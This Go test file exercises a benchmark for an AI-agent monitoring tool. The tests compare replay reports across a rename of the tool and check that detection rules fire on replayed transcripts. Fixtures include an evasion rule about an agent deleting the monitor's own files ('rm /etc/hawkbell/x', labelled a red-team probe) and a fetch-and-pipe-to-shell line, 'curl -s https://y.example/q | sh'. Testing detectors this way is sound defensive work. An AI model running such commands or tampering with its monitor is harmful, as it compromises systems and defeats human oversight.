package bench

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func renamedReports(t *testing.T) (before, now *ReplayReport) {
	t.Helper()
	before = &ReplayReport{
		Date: "2026-11-11", Corpus: "snapshot", RulesHash: "aaaa", RulesCount: 1,
		Rules: []ReplayRule{{ID: "SPR-EVADE-002", Title: "Agent changes spoor's files", Class: "alert", Hits: 2,
			Samples: []ReplaySample{{EventID: "01a1ce88-def9-7aaa-8aaa-aaaaaaaaaaaa", Thread: "t.jsonl", Summary: "rm /etc/spoor/x", Label: "red_team", Reason: "probe of spoor"}}}},
		Limits: []string{"one workload"},
	}
	now = &ReplayReport{
		Date: "2026-11-12", Corpus: "snapshot, rewritten", RulesHash: "bbbb", RulesCount: 1,
		Rules: []ReplayRule{{ID: "HB-EVADE-002", Title: "Agent changes hawkbell's files", Class: "alert", Hits: 2,
			Samples: []ReplaySample{{EventID: "01a1ce88-def9-7bbb-8bbb-bbbbbbbbbbbb", Thread: "t.jsonl", Summary: "rm /etc/hawkbell/x", Label: "red_team", Reason: "probe of hawkbell"}}}},
		Limits: []string{"one workload"},
	}
	return before, now
}

func TestCompareRenamed(t *testing.T) {
	before, now := renamedReports(t)
	b, _ := before.JSON()
	n, _ := now.JSON()
	run, diffs, err := CompareRenamed(b, n)
	if err != nil || len(diffs) != 0 {
		t.Fatalf("equal reports: %v %v", diffs, err)
	}
	if run.Date != "2026-11-11" || run.RulesHash != "aaaa" {
		t.Errorf("run %+v", run)
	}
	// A count, a label and the time prefix of an event id are compared.
	now.Rules[0].Hits = 3
	now.Rules[0].Samples[0].Label = "false_positive"
	now.Rules[0].Samples[0].EventID = "01a1ce88-def8-7bbb-8bbb-bbbbbbbbbbbb"
	n, _ = now.JSON()
	_, diffs, err = CompareRenamed(b, n)
	if err != nil {
		t.Fatal(err)
	}
	got := strings.Join(diffs, "\n")
	for _, want := range []string{"rules[HB-EVADE-002].hits: \"2\" before the rename, \"3\" now", "rules[HB-EVADE-002].samples[0].label:", "rules[HB-EVADE-002].samples[0].event_id:"} {
		if !strings.Contains(got, want) {
			t.Errorf("diffs lack %q:\n%s", want, got)
		}
	}
	// The old name is not read as the new one in a report made now.
	_, diffs, _ = CompareRenamed(n, b)
	if len(diffs) == 0 {
		t.Error("reports in the wrong order compared equal")
	}
	if _, _, err := CompareRenamed([]byte("[1]"), n); err == nil {
		t.Error("a report that is not an object was accepted")
	}
}

func TestMarkdownRenamed(t *testing.T) {
	_, now := renamedReports(t)
	if md := now.Markdown(nil); strings.Contains(md, "Regenerated after the rename") {
		t.Error("renamed paragraph without a compared report")
	}
	now.Renamed = &RenamedRun{Date: "2026-11-11", RulesHash: "5323a0c8ac33c240"}
	md := now.Markdown(nil)
	if !strings.Contains(md, "made before the rename (2026-11-11, packs hash `5323a0c8ac33`") {
		t.Errorf("renamed paragraph:\n%s", md)
	}
	if !strings.Contains(md, renamedHash) || !strings.Contains(renamedHash, "rules were changed after the rename") {
		t.Errorf("renamed paragraph does not say why the packs hash differs:\n%s", md)
	}
	sc := &ScenarioReport{Renamed: now.Renamed}
	if !strings.Contains(sc.Markdown(), "every number, class and result in the tables below is the same") {
		t.Error("scenario report lacks the renamed paragraph")
	}
}

// A report made before the rename, given as the earlier run, joins on its
// rule ids read as the current ones.
func TestMarkdownBeforeOldRuleIDs(t *testing.T) {
	before := &ReplayReport{Rules: []ReplayRule{
		{ID: "SPR-EXEC-001", Class: "finding", Hits: 3, Per1k: 1.5},
		{ID: "SPR-GONE-001", Class: "signal", Hits: 1, Per1k: 0.5},
	}}
	now := &ReplayReport{Rules: []ReplayRule{{ID: "HB-EXEC-001", Class: "finding", Hits: 1, Per1k: 0.5}}}
	md := now.Markdown(before)
	for _, want := range []string{"| HB-EXEC-001 | finding | 3 | 1.50 | 1 | 0.50 |", "| HB-GONE-001 | signal | 1 | 0.50 | 0 | 0.00 |"} {
		if !strings.Contains(md, want) {
			t.Errorf("markdown lacks %q:\n%s", want, md)
		}
	}
	if !strings.Contains(md, "its rule ids SPR-<PACK>-<NNN> are read as HB-<PACK>-<NNN>") {
		t.Errorf("markdown does not say the before columns had old ids:\n%s", md)
	}
	if strings.Contains(md, "| SPR-") {
		t.Errorf("old rule id in the table:\n%s", md)
	}
	if md := now.Markdown(now); strings.Contains(md, "read as HB-") {
		t.Error("old-id note with a report made after the rename")
	}
	if before.Rules[0].ID != "SPR-EXEC-001" {
		t.Error("the earlier report was modified")
	}
}

// ReplayOptions.Rewrite is applied to each line before it is parsed.
func TestReplayRewrite(t *testing.T) {
	root := filepath.Join(t.TempDir(), "projects")
	dir := filepath.Join(root, "-work-repo")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "s1.jsonl"), []byte(transcriptLines("s1", "curl -s https://y.example/q PIPE-TO-SHELL", "ls")), 0o600); err != nil {
		t.Fatal(err)
	}
	r := testRunner(t)
	o := ReplayOptions{Roots: []string{root}, Home: "/home/tester", User: owner()}
	plain, err := r.Replay(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	o.Rewrite = func(b []byte) []byte { return bytes.ReplaceAll(b, []byte("PIPE-TO-SHELL"), []byte("| sh")) }
	rewritten, err := r.Replay(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	if h := plain.rule("T-EXEC-001").Hits; h != 0 {
		t.Errorf("without the rewrite: %d hits", h)
	}
	if h := rewritten.rule("T-EXEC-001").Hits; h != 1 {
		t.Errorf("with the rewrite: %d hits", h)
	}
	if plain.Stats.ToolCalls != 2 || rewritten.Stats.ToolCalls != 2 {
		t.Errorf("tool calls %d / %d", plain.Stats.ToolCalls, rewritten.Stats.ToolCalls)
	}
}
